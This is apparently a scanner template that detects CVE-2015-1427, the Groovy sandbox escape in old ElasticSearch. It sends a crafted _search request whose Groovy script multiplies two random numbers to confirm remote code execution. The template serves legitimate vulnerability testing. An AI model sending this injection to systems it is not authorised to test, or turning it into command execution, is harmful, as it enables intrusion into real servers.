id: CVE-2015-1427

info:
  name: ElasticSearch - Remote Code Execution
  author: pikpikcu
  severity: critical
  verified: false
  description: ElasticSearch before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands via a crafted script to the Groovy scripting engine.
  reference:
    - https://blog.csdn.net/JiangBuLiu/article/details/94457980
    - http://www.elasticsearch.com/blog/elasticsearch-1-4-3-1-3-8-released/
    - https://nvd.nist.gov/vuln/detail/CVE-2015-1427
    - http://web.archive.org/web/20210506011817/https://www.securityfocus.com/bid/72585

set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
rules:
    r0:
        request:
            method: POST
            path: /test/test
            headers:
                Content-Type: application/json
            body: |
                {
                  "name": "test"
                }
        expression: response.status == 201
    r1:
        request:
            method: POST
            path: /_search
            headers:
                Content-Type: application/json
            body: |
                {
                    "size":1,
                    "script_fields":{
                        "lupin":{
                            "lang":"groovy",
                            "script":"{{r1}}*{{r2}}"
                        }
                    }
                }
        expression: response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1()
